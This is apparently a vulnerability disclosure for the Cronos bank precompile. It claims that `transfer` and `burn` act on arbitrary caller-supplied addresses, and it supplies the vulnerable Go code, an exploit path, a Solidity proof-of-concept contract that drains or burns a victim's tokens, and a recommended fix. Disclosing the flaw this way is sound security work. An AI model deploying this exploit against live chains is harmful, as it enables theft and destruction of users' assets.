### Title
Bank Precompile `transfer` and `burn` Accept Arbitrary Caller-Supplied Addresses, Allowing Any EVM Contract to Drain or Destroy Any Holder's `evm/<contract>` Native Tokens Without Authorization — (File: `x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The bank precompile's `transfer` method accepts a caller-supplied `sender` address and executes `bankKeeper.SendCoins` from that address without verifying the calling contract is authorized to spend from it. The `burn` method has the same flaw: it accepts a caller-supplied address and destroys tokens from it without consent. Any unprivileged EVM contract can drain or destroy the bank-module balances of any holder of its own `evm/<contractAddress>` denom.

---

### Finding Description

**Root cause — `transfer` (lines 167–200):**

In `BankContract.Run`, the `TransferMethodName` branch reads `sender` directly from `args[0]` (caller-supplied ABI input) and passes it as the `from` address to `bankKeeper.SendCoins`:

```go
sender := args[0].(common.Address)          // attacker-controlled
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())        // evm/<callerContract>
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()` or that the calling contract holds any allowance/authorization to spend from `sender`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses. [1](#0-0) 

**Root cause — `burn` (lines 143–149):**

The shared `MintMethodName, BurnMethodName` branch reads `recipient` (args[0]) as the address to burn **from** via `SendCoinsFromAccountToModule`. There is no check that this address equals `contract.Caller()`:

```go
recipient := args[0].(common.Address)   // attacker-controlled
...
addr := sdk.AccAddress(recipient.Bytes())
// burn path:
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
``` [2](#0-1) 

**Denom scoping does not prevent the attack.** The denom is `evm/<contract.Caller()>`, so the calling contract controls the denom namespace. But controlling the denom namespace is not the same as owning the balances held by other addresses in that denom. The precompile conflates "this contract issued this denom" with "this contract may move any holder's balance of this denom." [3](#0-2) 

**Exploit path:**

1. Attacker deploys `MaliciousContract` at address `0xATK`. Its denom becomes `evm/0xATK`.
2. Victims accumulate `evm/0xATK` tokens (e.g., via the contract's own `mint` calls, IBC auto-conversion, or any other flow that credits this denom to user accounts).
3. Attacker calls `MaliciousContract`, which calls `bank.transfer(victim, attacker, victimBalance)` on the bank precompile at `0x0000000000000000000000000000000000000064`.
4. The precompile executes `bankKeeper.SendCoins(ctx, victim, attacker, evm/0xATK)` — no authorization check, succeeds unconditionally.
5. All `evm/0xATK` tokens are drained from `victim` to `attacker`.

The same applies to `burn`: `bank.burn(victim, victimBalance)` destroys the victim's tokens with no consent.

The `TestBank` integration contract confirms the intended usage pattern — `nativeTransfer` passes `msg.sender` as the `sender` argument — but the precompile itself never enforces this constraint, leaving the door open for any contract to pass an arbitrary address instead. [4](#0-3) 

---

### Impact Explanation

**Critical — Unauthorized transfer and burn of precompile-controlled assets.**

Any unprivileged EVM contract can:
- Transfer `evm/<contractAddress>` native bank tokens from any holder to any recipient without the holder's consent.
- Burn `evm/<contractAddress>` native bank tokens from any holder without the holder's consent.

This directly satisfies the "Unauthorized transfer, burn, or balance/accounting change for CRC20, ERC20, or precompile-controlled assets" critical impact category. The `evm/<addr>` denom is a real bank-module asset that can be acquired through IBC conversion, direct minting, or other flows, and its loss is permanent.

---

### Likelihood Explanation

Exploitability requires only the ability to deploy an EVM contract — no privileged keys, governance, or admin access needed. The bank precompile is accessible to all EVM contracts. Any user who deploys a contract and distributes its `evm/<addr>` tokens (or whose contract is used by others) can immediately exploit this.

---

### Recommendation

In the `transfer` case, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

In the `burn` case, enforce that the address being burned from equals `contract.Caller()`:

```go
if recipient != contract.Caller() {
    return nil, errors.New("burn: can only burn from the calling contract's own address")
}
```

This preserves the intended design (a contract manages its own denom balance) while preventing unauthorized movement of other holders' balances.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function transfer(address, address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function mint(address, uint256) external payable returns (bool);
}

contract Exploit {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: mint evm/<address(this)> tokens to a victim
    function setupVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: steal victim's evm/<address(this)> tokens — no authorization check
    function stealFrom(address victim, address attacker, uint256 amount) external {
        bool ok = bank.transfer(victim, attacker, amount);
        require(ok, "transfer failed");
    }

    // Alternative: destroy victim's tokens
    function burnFrom(address victim, uint256 amount) external {
        bool ok = bank.burn(victim, amount);
        require(ok, "burn failed");
    }
}
```

Deploy `Exploit`; call `setupVictim(victim, 1000)`; then call `stealFrom(victim, attacker, 1000)`. The bank precompile executes `SendCoins(victim → attacker)` with no authorization check, transferring the victim's `evm/<Exploit address>` native tokens unconditionally.
